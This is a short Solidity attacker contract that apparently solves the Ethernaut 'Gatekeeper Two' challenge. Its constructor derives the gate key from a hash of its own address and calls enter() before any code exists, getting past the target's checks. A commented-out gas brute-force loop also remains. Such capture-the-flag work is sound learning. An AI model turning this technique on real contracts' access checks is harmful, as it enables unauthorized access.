// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IGateKeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker is Ownable{
    IGateKeeper public targetContract;

    // bytes8 public gateKey = 0x100000000000a1d1;
    bytes8 public gateKey;

    constructor(address _initialOwner, address _initialContract) Ownable(_initialOwner) {
        targetContract = IGateKeeper(_initialContract);
        gateKey = bytes8(uint64(type(uint64).max) ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        targetContract.enter(gateKey);
    }

    function setAttack(address _target) public onlyOwner{
        targetContract = IGateKeeper(_target);
    }

    function setGateKey(bytes8 _key) public onlyOwner {
        gateKey = _key;
    }

//     function attack() public onlyOwner returns (bool){
//         for (uint256 i = 0; i < 300; i++) {
//         try targetContract.enter{gas: 8191 * 10 + i}(gateKey) returns (bool result) {
//             return result;
//         } catch {}
//         }
//         revert("All attempts failed");
//     }
}